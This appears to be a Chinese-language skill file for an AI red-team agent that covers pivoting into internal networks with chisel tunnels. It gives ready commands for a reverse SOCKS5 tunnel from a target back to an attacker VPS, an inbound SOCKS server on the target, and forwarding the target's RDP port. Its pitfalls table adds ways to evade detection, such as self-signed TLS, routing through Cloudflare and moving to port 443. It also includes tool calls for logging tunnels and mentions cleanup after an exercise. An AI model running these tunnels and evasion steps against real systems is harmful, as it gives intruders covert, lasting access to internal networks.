---
name: chisel-tunnel
description: chisel 隧道：单二进制 socks5/端口转发，适合有外联但无 WebShell 的场景
tags: tunnel, chisel
---

# chisel 隧道

> 优点：单个二进制、协议简单（HTTP/WS），双向隧道都好用。
> 适用：目标能外连（或你有 VPS）、但不想/不能落 WebShell。

## 两条路

### A. 目标能主动外连（推荐）

```bash
# 你的 VPS
./chisel server -p 8080 --reverse

# 目标侧（连回 VPS，开一个 socks5）
./chisel client <VPS_IP>:8080 R:socks
```

`socks` 会在 **VPS** 上监听 1080。

### B. 只能从外向内（目标端口可达）

```bash
# 目标侧起 server
./chisel server -p 8081 --socks5

# 本地连过去
./chisel client <target>:8081 1080:socks
```

## 端口转发

```bash
# 把目标的 3389 转到本地
./chisel client <VPS_IP>:8080 13389:10.0.0.5:3389
```

## 验证

```bash
curl -x socks5://127.0.0.1:1080 http://<内网IP>/ -m 5 -i
```

## 落库

```
// A 路线：入口在目标侧（目标主动外连）
redteam_tunnel_add({ entryKind: 'target-outbound', listen: 'socks5://127.0.0.1:1080', reachable: '10.0.0.0/24' })

// B 路线：经目标端口
redteam_tunnel_add({ entryKind: 'target-http', listen: 'socks5://127.0.0.1:1080', reachable: '...' })
```

## 判定标准

- [ ] 明确写清是 A（目标外连）还是 B（外向内）
- [ ] 实测能访问真实内网目标
- [ ] `entryKind` 不是 `self-only`

## 常见坑

| 坑 | 处理 |
|---|---|
| VPS 上开代理就当成隧道 | 只有目标侧一端才算 `target-outbound`/`target-http` |
| TLS 指纹被识别 | 用 `--tls` + 自签证书，或走 Cloudflare |
| 目标出网被限 | 换 443 端口，或用 A 路线的 HTTP 伪装 |
| 忘记清理 | 演练结束停掉进程、删二进制 |
